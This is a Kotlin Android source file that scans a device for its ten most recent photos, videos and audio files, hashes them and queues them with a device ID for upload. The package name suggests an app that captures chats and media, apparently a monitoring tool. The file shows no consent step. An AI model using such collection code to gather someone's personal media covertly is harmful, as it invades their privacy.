package com.chats.capture.utils

import android.content.Context
import android.os.Build
import android.os.Environment
import android.provider.MediaStore
import com.chats.capture.CaptureApplication
import com.chats.capture.database.MediaFileDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.UploadStatus
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.io.File
import java.security.MessageDigest

/**
 * Scanner for finding and cataloging recent media files on device
 */
class FileScanner(private val context: Context) {
    
    private val mediaFileDao: MediaFileDao = (context.applicationContext as CaptureApplication).database.mediaFileDao()
    private val deviceRegistrationManager = DeviceRegistrationManager(context)
    
    /**
     * Scan for last 10 media files (images, videos, audio)
     * Saves them to media_files database for upload
     */
    suspend fun scanLast10MediaFiles(): List<MediaFile> = withContext(Dispatchers.IO) {
        try {
            val deviceId = deviceRegistrationManager.getDeviceId()
            val mediaFiles = mutableListOf<MediaFile>()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10+ - Use MediaStore API
                mediaFiles.addAll(scanUsingMediaStore(deviceId))
            } else {
                // Android 9 and below - Use file system traversal
                mediaFiles.addAll(scanUsingFileSystem(deviceId))
            }
            
            // Save to database
            mediaFiles.forEach { mediaFile ->
                try {
                    // Check if file already exists (by checksum)
                    val existing = mediaFileDao.findMediaFileByChecksum(mediaFile.checksum)
                    if (existing == null) {
                        mediaFileDao.insertMediaFile(mediaFile)
                        Timber.d("Media file added from file scan: ${mediaFile.localPath}")
                    } else {
                        Timber.v("Media file already exists: ${mediaFile.localPath}")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error saving media file: ${mediaFile.localPath}")
                }
            }
            
            Timber.d("Scanned ${mediaFiles.size} media files from device storage")
            mediaFiles
        } catch (e: Exception) {
            Timber.e(e, "Error scanning media files")
            emptyList()
        }
    }
    
    /**
     * Scan using MediaStore API (Android 10+)
     */
    @android.annotation.SuppressLint("InlinedApi")
    private suspend fun scanUsingMediaStore(deviceId: String?): List<MediaFile> {
        val mediaFiles = mutableListOf<MediaFile>()
        
        try {
            // Query images
            val images = queryMediaStore(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/*")
            
            // Query videos
            val videos = queryMediaStore(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video/*")
            
            // Query audio
            val audio = queryMediaStore(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio/*")
            
            // Combine and sort by date modified
            val allMedia = (images + videos + audio).sortedByDescending { it.second }
            
            // Take last 10
            val last10 = allMedia.take(10)
            
            last10.forEach { (path, dateModified) ->
                try {
                    val file = File(path)
                    if (file.exists() && file.length() > 0) {
                        val checksum = calculateChecksum(file)
                        val mimeType = determineMimeType(file)
                        
                        val mediaFile = MediaFile(
                            deviceId = deviceId,
                            notificationId = "file_scan_${dateModified}",
                            appPackage = null, // System file, not app-specific
                            localPath = path,
                            fileSize = file.length(),
                            mimeType = mimeType,
                            checksum = checksum,
                            uploadStatus = UploadStatus.PENDING
                        )
                        mediaFiles.add(mediaFile)
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error processing media file: $path")
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error querying MediaStore")
        }
        
        return mediaFiles
    }
    
    /**
     * Query MediaStore for media files
     */
    private fun queryMediaStore(uri: android.net.Uri, mimeTypeFilter: String): List<Pair<String, Long>> {
        val mediaFiles = mutableListOf<Pair<String, Long>>()
        
        try {
            val projection = arrayOf(
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DATE_MODIFIED
            )
            
            val selection = "${MediaStore.MediaColumns.MIME_TYPE} LIKE ?"
            val selectionArgs = arrayOf(mimeTypeFilter)
            val sortOrder = "${MediaStore.MediaColumns.DATE_MODIFIED} DESC LIMIT 10"
            
            context.contentResolver.query(
                uri,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )?.use { cursor ->
                val dataColumn = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
                val dateModifiedColumn = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
                
                while (cursor.moveToNext()) {
                    val path = cursor.getString(dataColumn)
                    val dateModified = cursor.getLong(dateModifiedColumn)
                    
                    if (path != null) {
                        mediaFiles.add(Pair(path, dateModified))
                    }
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error querying MediaStore: $uri")
        }
        
        return mediaFiles
    }
    
    /**
     * Scan using file system traversal (Android 9 and below)
     */
    private suspend fun scanUsingFileSystem(deviceId: String?): List<MediaFile> {
        val mediaFiles = mutableListOf<MediaFile>()
        val fileList = mutableListOf<Pair<File, Long>>()
        
        try {
            val externalStorage = Environment.getExternalStorageDirectory()
            if (!externalStorage.exists()) {
                Timber.w("External storage not available")
                return emptyList()
            }
            
            // Scan common media directories
            val mediaDirectories = listOf(
                File(externalStorage, "DCIM"),
                File(externalStorage, "Pictures"),
                File(externalStorage, "Movies"),
                File(externalStorage, "Music"),
                File(externalStorage, "Download")
            )
            
            mediaDirectories.forEach { dir ->
                if (dir.exists() && dir.isDirectory) {
                    scanDirectory(dir, fileList)
                }
            }
            
            // Sort by date modified (newest first) and take last 10
            val last10 = fileList.sortedByDescending { it.second }.take(10)
            
            last10.forEach { (file, dateModified) ->
                try {
                    val checksum = calculateChecksum(file)
                    val mimeType = determineMimeType(file)
                    
                    val mediaFile = MediaFile(
                        deviceId = deviceId,
                        notificationId = "file_scan_${dateModified}",
                        appPackage = null,
                        localPath = file.absolutePath,
                        fileSize = file.length(),
                        mimeType = mimeType,
                        checksum = checksum,
                        uploadStatus = UploadStatus.PENDING
                    )
                    mediaFiles.add(mediaFile)
                } catch (e: Exception) {
                    Timber.e(e, "Error processing file: ${file.absolutePath}")
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error scanning file system")
        }
        
        return mediaFiles
    }
    
    /**
     * Recursively scan directory for media files
     */
    private fun scanDirectory(directory: File, fileList: MutableList<Pair<File, Long>>) {
        try {
            directory.listFiles()?.forEach { file ->
                if (file.isDirectory) {
                    // Recursively scan subdirectories (limit depth to avoid too many files)
                    if (fileList.size < 100) {
                        scanDirectory(file, fileList)
                    }
                } else if (file.isFile && isMediaFile(file)) {
                    val dateModified = file.lastModified()
                    fileList.add(Pair(file, dateModified))
                }
            }
        } catch (e: Exception) {
            Timber.w(e, "Error scanning directory: ${directory.absolutePath}")
        }
    }
    
    /**
     * Check if file is a media file based on extension
     */
    private fun isMediaFile(file: File): Boolean {
        val extension = file.extension.lowercase()
        return extension in listOf(
            "jpg", "jpeg", "png", "gif", "webp", // Images
            "mp4", "webm", "mov", "avi", // Videos
            "mp3", "ogg", "wav", "m4a", "aac" // Audio
        )
    }
    
    /**
     * Calculate SHA-256 checksum of file
     */
    private fun calculateChecksum(file: File): String {
        val md = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                md.update(buffer, 0, bytesRead)
            }
        }
        return md.digest().joinToString("") { "%02x".format(it) }
    }
    
    /**
     * Determine MIME type from file extension
     */
    private fun determineMimeType(file: File): String {
        val extension = file.extension.lowercase()
        return when (extension) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "webp" -> "image/webp"
            "mp4" -> "video/mp4"
            "webm" -> "video/webm"
            "mov" -> "video/quicktime"
            "avi" -> "video/x-msvideo"
            "mp3" -> "audio/mpeg"
            "ogg" -> "audio/ogg"
            "wav" -> "audio/wav"
            "m4a" -> "audio/mp4"
            "aac" -> "audio/aac"
            else -> "application/octet-stream"
        }
    }
}
